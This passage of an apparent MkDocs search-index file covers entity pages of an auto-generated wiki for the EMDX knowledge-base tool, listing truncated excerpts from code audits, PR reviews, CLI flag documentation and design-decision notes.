Entities","text":"<ul> <li><code>output_tokens</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (13 shared docs, PMI=6.0)</li> <li><code>execution_time_ms</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.0)</li> <li><code>unified executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.0)</li> <li><code>`emdx/services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.0)</li> <li><code>.types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.0)</li> <li><code>execution.is_zombie</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>task_id: optional[int] = none</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>task redo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>schema debt fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>tokens_used</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (13 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/issues-found/","title":"issues found","text":"<p>Type: heading | Mentioned in: 17 documents | First seen: 2026-01-10</p>"},{"location":"entities/issues-found/#documents-17","title":"Documents (17)","text":"<ul> <li>#6862 Delegate: Audit README.md: Read the full README.md and check every CLI [1/3] <p>Let me compile the final audit report. ---</p> </li> </ul>"},{"location":"entities/issues-found/#readmemd-audit-report","title":"README.md Audit Report","text":""},{"location":"entities/issues-found/#issues-found_1","title":"Issues Found","text":"<p>Issue 1 \u2014 Line 3: Version badge is hardcoded The badge says <code>version-0.20.0</code> which matches the current version. Not a bug now, but it will go stale on next r...</p> <ul> <li>#6393 Delegate: Fix resource leaks in file handles and connections. Task #627   Section: Fix Resource Leaks in File Handles - Task #627 </li> <li>claude_executor.py line ~160: <code>log_handle = open(log_file, 'a')</code> - If <code>subprocess.Popen()</code> raised an exception, the file handle would leak</li> <li> <p>claude_executor.py line ~197: Same issue in the nohup fallback path</p> </li> <li> <p>#6377 Codebase Bug Audit 2026-02-15 [5/10]</p> </li> </ul> <p>Audit Date: 2026-02-15 Scope: emdx/config/, emdx/init.py, emdx/main.py, emdx/main.py Auditor: Claude Code</p>"},{"location":"entities/issues-found/#issues-found_2","title":"Issues Found","text":""},{"location":"entities/issues-found/#emdx-config-module-bug-audit","title":"EMDX Config Module Bug Audit","text":""},{"location":"entities/issues-found/#summary","title":"Summary","text":"<p>Found 7 issues across the config module and entry points. ---</p>"},{"location":"entities/issues-found/#issues-fo","title":"Issues Fo...","text":"<ul> <li>#6310 Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15] <p>DTO Pattern \u2014 Dataclasses for typed results (<code>Execution</code>, <code>SemanticMatch</code>, etc.)</p> </li> <li>Context Manager \u2014 Database connections via <code>get_connection()</code> context manager</li> </ul>"},{"location":"entities/issues-found/#issues-found_3","title":"Issues Found","text":""},{"location":"entities/issues-found/#1-global-state-database-singleton","title":"1. GLOBAL STATE: Database Singleton","text":"<p>Location: `d...</p> <ul> <li> <p>#6229 Delegate: Audit DEPENDENCY DEBT in the emdx project: Check pyproject.t [1/14]   Section: Issues Found</p> </li> <li> <p>#6151 Delegate: Review PR #453 (Ask the KB). Run: gh pr diff 453. Check code [6/7]   Section: Verdict: \u2705 APPROVE</p> <p>PR cleanly implements the gameplan requirements. No correctness issues found. Test coverage could be better but existing tests pass and new code follows established patterns. Good match to gameplan #6103.</p> </li> <li> <p>#6150 Delegate: Review PR #448 (Contextual Save). Run: gh pr diff 448. Check [2/7]</p> <p>Good error handling: Multiple try/except blocks with fallback paths</p> </li> <li>Threshold constants: Clearly defined at module level (DUPLICATE_THRESHOLD, etc.)</li> </ul>"},{"location":"entities/issues-found/#critical-0","title":"\ud83d\udd34 CRITICAL (0)","text":"<p>No critical issues found.</p>"},{"location":"entities/issues-found/#issues-found_4","title":"Issues Found","text":"<p>1. Unused import in contextual_save.py (Minor) ```python import sys...</p> <ul> <li>#6148 Delegate: Review PR #449 (Dream Journal). Run: gh pr diff 449. Check c [3/7] </li> </ul> Gameplan Requirement Status Notes Duplicate detection pass \u2705 Uses <code>find_all_duplicate_pairs()</code> from existing SimilarityService Pattern detection \u2705 Cross-... <ul> <li>#6146 Delegate: Review PR #446 (Smart Priming). Run: gh pr diff 446. Check c [1/7] </li> </ul>"},{"location":"entities/issues-found/#gameplan-alignment-vs-6101","title":"Gameplan Alignment (vs #6101)","text":""},{"location":"entities/issues-found/#pr-446-review-smart-priming-emdx-prime-smart","title":"PR #446 Review: Smart Priming (<code>emdx prime --smart</code>)","text":""},{"location":"entities/issues-found/#summary_1","title":"Summary","text":"<p>PR adds <code>--smart</code> flag to <code>emdx prime</code> command implementing context-aware priming per gameplan #6099. ## Gameplan Compliance \u2705</p> <p>| Requirement | Status | Notes | |------------|--------...</p> <ul> <li>#6147 Delegate: Review PR #452 (Auto-Linking). Run: gh pr diff 452. Check co [5/7] <p>Bidirectional links \u2014 Both forward and reverse links created</p> </li> <li>Good CLI UX \u2014 Tree display, progress indicators, stats command</li> </ul>"},{"location":"entities/issues-found/#issues-found_5","title":"Issues Found","text":""},{"location":"entities/issues-found/#p2-no-tests","title":"\u26a0\ufe0f P2: No tests","text":"<p>No test files reference <code>linking_service</code> or <code>LinkingService</code>. This is a si...</p> <ul> <li> <p>#6164 Delegate: Audit CLAUDE.md (578 lines) for accuracy. Check: (1) does it [6/17]   Section: Audit Checklist Results</p> </li> <li> <p>#6547 Delegate: Review PR #653 using 'gh pr view 653' and 'gh pr diff 653'.  [1/6]   Section: Review Assessment</p> <p>Issues Found: None</p> </li> <li> <p>#6502 None Type Analysis [1/7]</p> <ul> <li><code>editor</code>: Optional override; falls back to <code>$EDITOR</code> or <code>nano</code>. ---</li> </ul> </li> </ul>"},{"location":"entities/issues-found/#3-cli-examples-command-accuracy","title":"(3) CLI Examples - Command Accuracy","text":"<p>\u26a0\ufe0f ISSUES FOUND:</p>"},{"location":"entities/issues-found/#summary_2","title":"Summary","text":""},{"location":"entities/issues-found/#delegatepy-issues-found","title":"delegate.py Issues Found","text":"Line Current Recommended Issue 1008 <code>jobs: int = typer.Option(None, ...)</code> `jobs:... <ul> <li>#6194 Analysis: Delegate + Activity Browser Issues </li> </ul>"},{"location":"entities/issues-found/#delegate-activity-browser-issues-analysis","title":"Delegate + Activity Browser: Issues Analysis","text":""},{"location":"entities/issues-found/#6-issues-found","title":"6 Issues Found","text":""},{"location":"entities/issues-found/#critical-executiondoc_id-never-updated-after-delegate-completes","title":"CRITICAL: execution.doc_id never updated after delegate completes","text":"<ul> <li>Location: <code>emdx/commands/delegate.py:246-247</code></li> <li> <p>Problem: When delegate finishes, it updates `task.outpu...</p> </li> <li> <p>#6175 Delegate: Audit emdx/utils/ for dead code. For EACH of the 18 files in [4/17]</p> <p><code>environment.py</code></p> </li> <li>Status: Actively used</li> <li>Imports at: <code>emdx/services/claude_executor.py:26</code>, <code>emdx/services/task_runner.py:13</code></li> <li>Used exports: <code>get_subprocess_env</code>, <code>ensure_claude_in_path</code>, <code>validate_execution_environment</code></li> <li> <p>Notes: A...</p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: Metrics Summary</p> Category Issues Found Severity WORKAROUND/HACK comments 1 Medium Silent exception swallowing 50+ High Deprecated/dead code 3... </li> </ul>"},{"location":"entities/issues-found/#related-entities","title":"Related Entities","text":"<ul> <li><code>verdict: necessary (both)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>verdict: necessary (both param and return)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>verdict: n/a</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>verdict: both necessary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>typer command:</code>view<code>(lines 772-852)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>typer command:</code>save<code>(lines 186-337)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>typer command:</code>find<code>(lines 340-551)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>typer command:</code>edit<code>(lines 928-1043)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>typer command:</code>delegate<code>(lines 983-1331)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>typer command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/json/","title":"--json","text":"<p>Type: tech_term | Mentioned in: 29 documents | First seen: 2026-02-13</p>"},{"location":"entities/json/#documents-29","title":"Documents (29)","text":"<ul> <li> <p>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/cli-api.md</p> <p>...explore<code>is a full top-level command with</code>--threshold<code>,</code>--questions<code>,</code>--gaps<code>,</code>--json<code>,</code>--rich<code>,</code>--limit` flags. It clusters documents by content similarity to build a topic map. Not mentioned in cli-api.md at all.</p> </li> <li> <p>#6862 Delegate: Audit README.md: Read the full README.md and check every CLI [1/3]   Section: Issues Found</p> <p>Issue 10 \u2014 Missing <code>--json</code> flag on <code>emdx delegate</code> in documentation The README doesn't mention <code>--json</code> for structured output from delegates. Low priority.</p> </li> <li> <p>#6850 Delegate: FEAT-37 (Issue #1249): Add wiki coverage command. Create 'em [1/4]   Section: Summary</p> <p>...entage</p> </li> <li>Displays uncovered documents in a Rich table (ID, title, created date)</li> <li><code>--json</code> flag for machine-readable output</li> <li> <p><code>--limit N</code> to cap displayed results (total count still reported accurately)</p> </li> <li> <p>#6825 Delegate: --help [2/2]   Section: Options</p> <p>...tasks | | <code>--cleanup</code> | \u2014 | \u2014 | Remove stale delegate worktrees (&gt;1 hour old) | | <code>--json</code> | \u2014 | \u2014 | Output structured JSON with task_id, doc_id, exit_code, duration |</p> </li> <li> <p>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]   Section: Summary</p> <ol> <li>Added <code>--json</code> to the Options Reference table (line 935) with description: \"Structured JSON output (implies <code>--quiet</code>)\"</li> </ol> </li> <li> <p>#6810 Delegate: Fix DOC-6: Update docs/cli-api.md with new task commands fro [1/5]   Section: Summary</p> <ol> <li><code>task wontdo</code> command \u2014 Closes tasks without marking done. Supports <code>--note</code> for reason and <code>--json</code> output. Terminal status that unblocks dependents.</li> </ol> </li> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: Recommendation: Three-Tier Scoring with Noise Filtering</p> <p>...UNC_CALL | 53 | <code>_run_discovery()</code>, <code>shlex.split()</code> | | CLI_FLAG | 27 | <code>--each</code>, <code>--json</code> | | SUMMARY_NOISE | 12 | <code>summary fixed</code>, <code>summary added</code> | | TYPE_ANNOT | 8 | <code>dict[str, any]</code>, <code>list[dict[str, any]]</code> |</p> </li> <li> <p>#6714 Wiki Generation Architecture Research [10/10]   Section: Signature:</p> <p>...=\"Generate N articles concurrently\"),     json_output: bool = typer.Option(False, \"--json\", help=\"Output as JSON\"),     quiet: bool = typer.Option(False, \"--quiet\", \"-q\", help=\"Minimal output\"), ) -&gt; None: ```</p> </li> <li> <p>#6693 Delegate: Research UX patterns for surfacing multi-method document lin [4/4]   Section: Problem Summary</p> <p>...y_score DESC`</p> </li> <li><code>_print_related_docs()</code> in view header \u2192 dumps ALL links inline</li> <li> <p><code>--json</code> output \u2192 flat list, no grouping</p> </li> <li> <p>#6690 Delegate: Research UX patterns for surfacing multi-method document lin [4/4]   Section: Recommendation 2: Filter at Query Time, Not Storage Time</p> <p>...<code>emdx find --similar</code> or future features like \"cluster by shared entities\"</p> </li> <li>The <code>--json</code> output for agents should return the full unfiltered set</li> <li>Storage cost is trivial (one row per link)</li> <li> <p>The <code>emdx ai links --json</code> path is the agent interface \u2014 agen...</p> </li> <li> <p>#6680 Delegate Slimming Research [3/3]   Section: High-value opportunities:</p> <ol> <li>PreToolUse <code>updatedInput</code> \u2014 Can modify tool inputs before execution. Could auto-inject <code>poetry run</code> prefix, enforce <code>--json</code> flags, redirect writes, etc.</li> </ol> </li> <li> <p>#6679 Claude Code Hooks System \u2014 Full Capability Research   Section: Key Capabilities We're NOT Using</p> <p>Opportunity: Could auto-inject <code>poetry run</code> prefix to emdx commands, or enforce <code>--json</code> flag on certain commands.</p> </li> <li> <p>#6546 Delegate Enhancement Gameplans [synthesis]   Section: Key Findings by Feature</p> <p>Output Design: Action on stdout (for Claude), reasoning on stderr (for humans). Supports <code>--json</code> and <code>--verbose</code>.</p> </li> <li> <p>#6473 EMDX Strategy: The Dual-Interface Knowledge Layer   Section: Design Principles</p> <ol> <li>Same commands, different output modes: <code>--json</code> for agents, rich tables for humans</li> </ol> </li> <li>Humans are the default: Don't optimize for machines at human expense</li> <li> <p>Explicit beats implicit: Flags override auto-d...</p> </li> <li> <p>#6438 Delegate: Update docs/cli-api.md: The emdx find command now supports h [1/3]   Section: Changes Made</p> <p>...ippets`** - Show snippet previews in results (existing but was undocumented)</p> </li> <li> <p><code>--json</code> - Output results as JSON (existing but was undocumented)</p> </li> <li> <p>#6413 Delegate: Implement 'emdx review' CLI commands for triaging agent-prod   Section: Files Changed</p> <ol> <li><code>emdx review list</code> - Lists documents tagged 'needs-review'</li> </ol> </li> <li>Shows Rich table with ID, title, created date, and tags</li> <li>Supports <code>--limit</code> for pagination</li> <li> <p>Supports <code>--json</code> for JSON output</p> </li> <li> <p>#6412 Delegate: Implement 'emdx review' CLI commands for triaging agent outp   Section: Changes Made</p> <ul> <li><code>emdx review list</code> \u2014 Shows documents tagged 'needs-review'</li> </ul> </li> <li>Supports <code>--limit</code> and <code>--json</code> options</li> <li> <p>Displays clean table with document info</p> </li> <li> <p>#6408 EMDX Strategy v2: Dual-Interface Knowledge Layer   Section: Design Principle</p> <p>Same commands, different output modes. Same data, different views. <code>--json</code> is the agent lens. Rich tables/TUI is the human lens. Epics and categories serve both \u2014 they organize for humans and scope for agents.</p> </li> <li> <p>#6399 Delegate: Add systematic --json output support across all emdx CLI com   Section: Add --json Output Support to CLI Commands</p> </li> <li> <p>#6398 Delegate synthesis [synthesis]   Section: 2. The Dual-Interface Architecture Solution</p> <ul> <li>Explicit flags beat auto-detection: <code>--json</code>, <code>--quiet</code>, <code>--porcelain</code></li> </ul> </li> <li>Sensible defaults based on context: TTY detection, environment variables</li> <li> <p>One code path, multiple outputs: Same logic, differen...</p> </li> <li> <p>#6397 Delegate: Design a concrete 'dual-interface' architecture for EMDX whe [2/3]   Section: Executive Summary</p> <p>...a first-class feature that benefits everyone**. The best tools (git porcelain, gh --json) treat machine-friendly output as a feature, not a compatibility hack.</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: Agent Patterns</p> <p>Search Behavior:</p> </li> <li>Exact terms: <code>emdx find \"SEC-42\"</code> or doc IDs</li> <li>Tag filters: <code>emdx find --tags \"gameplan,active\" --json</code></li> <li>ID-based access: <code>emdx view 123 --no-pager --raw</code></li> <li> <p>Pre-session priming: <code>emdx prime --format json</code></p> </li> <li> <p>#6383 Strategy: EMDX as Agent Workspace   Section: Directions to Explore</p> <p>...agent workflows: claim, complete, blocked, context</p> </li> <li>Structured output mode (<code>--json</code> everywhere) \u2014 Claude Code parses JSON better than tables</li> <li> <p><code>emdx agent plan</code> \u2014 first-class plan lifecycle rather than \"save with gameplan tag\"</p> </li> <li> <p>#6369 Delegate: Re-implement the Knowledge Decay feature (originally PR #451)   Section: New Commands</p> <p>Options:</p> </li> <li><code>--critical-days</code>, <code>--warning-days</code>, <code>--info-days</code> - Configurable thresholds</li> <li><code>--project</code> - Filter by project</li> <li><code>--level</code> - Filter by level (critical, warning, info)</li> <li> <p><code>--json</code> - JSON output</p> </li> <li> <p>#6313 Delegate: Analyze BOILERPLATE &amp; REPEATED PATTERNS across emdx/ (exclud [9/15]   Section: 5. typer.Option Pattern (202 occurrences)</p> <p>...<code>--force/-f</code> | 12+ | skip confirmation | | <code>--verbose/-v</code> | 8+ | debug output | | <code>--json</code> | 7+ | JSON output format |</p> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 1. Command Redundancy - HIGH IMPACT</p> <p>Status/Prime overlap:</p> </li> <li><code>emdx status</code> and <code>emdx prime</code> have significant overlap - both show tasks, cascade queue, and execution state</li> <li> <p>Suggestion: Merge into single command with <code>--json</code>/<code>--verbose</code> flags for different use cases</p> </li> <li> <p>#6226 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: MEDIUM SEVERITY (Error Handling)</p> <p>Impact: Parsing errors programmatically is unreliable. Recommendation: Standardize on <code>[red]Error: {message}[/red]</code> format; add <code>--json</code> output for errors.</p> </li> <li> <p>#6150 Delegate: Review PR #448 (Contextual Save). Run: gh pr diff 448. Check [2/7]   Section: Gameplan #6097 Compliance</p> <p>...embeddings unavailable | \u2705 FTS5 fallback implemented | | JSON output support | \u2705 <code>--json</code> flag on check command | | Don't block saves (warn only) | \u2705 Saves then warns |</p> </li> <li> <p>#6142 Delegate: Read gameplan by running: emdx view 6102. Implement the Know [6/7]   Section: New Commands</p> <p>...60 days (archive candidates)</p> </li> <li>Options: <code>--project</code>, <code>--limit</code>, <code>--min-days</code>, <code>--json</code></li> </ul>"},{"location":"entities/json/#summary","title":"Summary","text":"<p>Added systematic <code>--json</code> output support across EMDX CLI commands.</p>"},{"location":"entities/json/#related-entities","title":"Related Entities","text":"<ul> <li><code>humans are the default</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>explicit beats implicit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>emdx briefing --since</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>--porcelain</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>--note</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>wraps claude</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>worktreeremove</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>worktreecreate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>workflow, not just artifacts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>userpromptsubmit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> </ul>"},{"location":"entities/key-design-decisions/","title":"key design decisions","text":"<p>Type: heading | Mentioned in: 18 documents | First seen: 2026-01-05</p>"},{"location":"entities/key-design-decisions/#documents-18","title":"Documents (18)","text":"<ul> <li>#6776 Auto-Wiki Architecture \u2014 Synthesized Research <p>Entity index pages (computed views, ~200-300 full pages, ~500 stubs)     \u2193</p> </li> <li>MkDocs + Material theme \u2192 static site    \u2192 topics/ for synthesized articles    \u2192 entities/ for glossary pages    \u2192 D3.js graph visualization</li> </ul> <pre><code>\n## Key Design Decisions\n\n|...\n\n- **#6771** Wiki Generation Architecture Research \u2014 Complete Analysis\n  &gt; **Quality scoring** \u2014 ORES-inspired tiered assessment using structural features (word count, sections, citations, cross-links)\n7. **Incremental updates** \u2014 Re-process only changed documents and their neighbors (Graphiti-style graph locality)\n\n### Key...\n\n- **#6743** wiki-synthesis-research\n  *Section: Standard Wiki Article Template*\n  &gt; ## History / Decisions\n[Key design decisions, evolution over time \u2014 if relevant]\n\n- **#6720** wiki-privacy-research\n  &gt; **Phase 3:** Add post-processing validation and human review flagging\n4. **Phase 4:** Extend entity service with people-mention classification\n\n---\n\n## Key Design Decisions\n\n1. **Mark, don't remove** temporal content in pre-processing -- the LLM need...\n\n- **#6478** PROZE: AI-Powered Prose Diff Tool\n  &gt; **Word Diff**: For modified blocks, show word-level changes with semantic cleanup\n5. **Render**: Beautiful terminal output with move/reword annotations\n\n### Key Design Decisions\n\n- **Paragraph as unit**: More readable than sentence-level diffs\n- **Mo...\n\n- **#6476** EMDX Knowledge Base Enhancement: Complete Implementation Guide\n  &gt; Uses Claude Opus to merge related documents while preserving insights and eliminating duplication. ### Architecture\n\n</code></pre> <p>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502                        emdx compact                        ...</p> <ul> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]</p> <p>Internal lookups now pass <code>track_access=False</code> to prevent count inflation. ## Key Design Decisions</p> </li> <li> <p>Local-first: SQLite + no cloud deps = simple deployment, offline capable 2.</p> </li> <li> <p>#6103 Gameplan #7: Ask the KB (RAG Q&amp;A)   Section: Implementation Steps</p> </li> <li>Source attribution \u2014 every answer MUST cite its sources by doc ID</li> <li>No hallucination \u2014 if the KB doesn't have relevant info, say so</li> <li> <p>**Token budget for co...</p> </li> <li> <p>#6102 Gameplan #6: Knowledge Decay &amp; Spaced Resurfacing   Section: Implementation Steps</p> </li> <li>No AI calls \u2014 pure heuristic scoring. Fast and deterministic.</li> <li> <p>View = review \u2014 viewing a doc resets its staleness. No separate \"review\" action needed (tou...</p> </li> <li> <p>#6101 Gameplan #5: Dream Journal (Overnight Consolidation)   Section: Implementation Steps</p> </li> <li>No auto-merge \u2014 too dangerous. Suggest merges, let human/Claude decide.</li> <li>Digest-first \u2014 always generate a readable digest. Actions are optional.</li> <li> <p>**Incre...</p> </li> <li> <p>#6100 Gameplan #4: Semantic Find Upgrade   Section: Implementation Steps</p> </li> <li>Chunk size \u2014 split on markdown headings first, then on double-newlines if chunks are too large. Don't split mid-paragraph.</li> <li> <p>Heading path \u2014 store the full...</p> </li> <li> <p>#6099 Gameplan #3: Smart Priming   Section: Implementation Steps</p> </li> <li>Token budget \u2014 prime output must be &lt;500 tokens. Claude's context is precious.</li> <li> <p>Deterministic \u2014 no AI calls in prime itself. It's a data aggregation comma...</p> </li> <li> <p>#6098 Gameplan #2: Auto-Linking on Save   Section: Implementation Steps</p> </li> <li>Bidirectional links \u2014 if A\u2192B exists, B\u2192A should too (possibly with same score)</li> <li>Top N links \u2014 cap at 5 to avoid noise. Can tune threshold later.</li> <li> <p>**Simil...</p> </li> <li> <p>#6097 Gameplan #1: Contextual Save   Section: Implementation Steps</p> </li> <li>Don't block saves \u2014 always save, just warn. Claude can decide to delete + edit instead.</li> <li> <p>Threshold tuning \u2014 start with 80% for \"duplicate\" warning, adjust...</p> </li> <li> <p>#6086 PROZE - AI-Powered Prose Diff Tool - Master Gameplan</p> <p>{--This sentence was removed entirely.--} {++This new sentence was added.++} ```</p> </li> </ul>"},{"location":"entities/key-design-decisions/#key-design-decisions_1","title":"Key Design Decisions","text":""},{"location":"entities/key-design-decisions/#key-design-decisions_2","title":"Key Design Decisions","text":""},{"location":"entities/key-design-decisions/#key-design-decisions_3","title":"Key Design Decisions","text":""},{"location":"entities/key-design-decisions/#key-design-decisions_4","title":"Key Design Decisions","text":""},{"location":"entities/key-design-decisions/#key-design-decisions_5","title":"Key Design Decisions","text":""},{"location":"entities/key-design-decisions/#key-design-decisions_6","title":"Key Design Decisions","text":""},{"location":"entities/key-design-decisions/#key-design-decisions_7","title":"Key Design Decisions","text":""},{"location":"entities/key-design-decisions/#unified-diff-output-unified","title":"Unified diff output (--unified)","text":"<p>Standard unified diff format for piping to other tools. ---</p>"},{"location":"entities/key-design-decisions/#implementation-phases","title":"Implementation Phases","text":""},{"location":"entities/key-design-decisions/#phase-1-mvp-structural-diff-2-3-weeks","title":"Phase 1: MVP \u2014 Structural Diff (2-3 weeks...","text":"<ul> <li>#1835 Architecture Analysis: EMDX Control Center v5 Implementation <p>Missing Models</p> </li> </ul> <p>Need in <code>/emdx/models/</code>: - <code>gameplans.py</code> - Gameplan CRUD and queries - <code>tasks.py</code> - Task CRUD and status transitions - <code>work_log.py</code> - Work log operations</p>"},{"location":"entities/key-design-decisions/#4-missing-tui-browser","title":"4. Missing TUI Browser","text":"<p>Need <code>/emdx/ui/gameplan_browser.py</code>: - Gameplan l...</p> <ul> <li>#6567 Delegate synthesis [synthesis] </li> </ul> Decision Rationale Thread-based I/O <code>select.select()</code> fails on macOS subprocess pipes Queue-based streaming Reliable cross-platform, enables timeout enforcement Strategy patter... <ul> <li>#6368 Gameplans: compact, distill, and draft-pr [synthesis]   Section: 1. <code>emdx compact</code> Command <p>Key Design Decisions: | Decision | Rationale | |----------|-----------| | Always use Opus | Quality-critical task; infrequent operation justifies cost | | Archive, not delete | Reversi...</p> </li> </ul>"},{"location":"entities/key-design-decisions/#3-key-design-decisions","title":"3. Key Design Decisions","text":""},{"location":"entities/key-design-decisions/#related-entities","title":"Related Entities","text":"<ul> <li><code>technical requirements</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.6)</li> <li><code>effort estimate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.6)</li> <li><code>security notes</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>vision every</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>tier 3: deep semantic (cloud ai, opt-in)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>synthesis pipeline</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>synergies</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>smart matching</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>required extras</code> 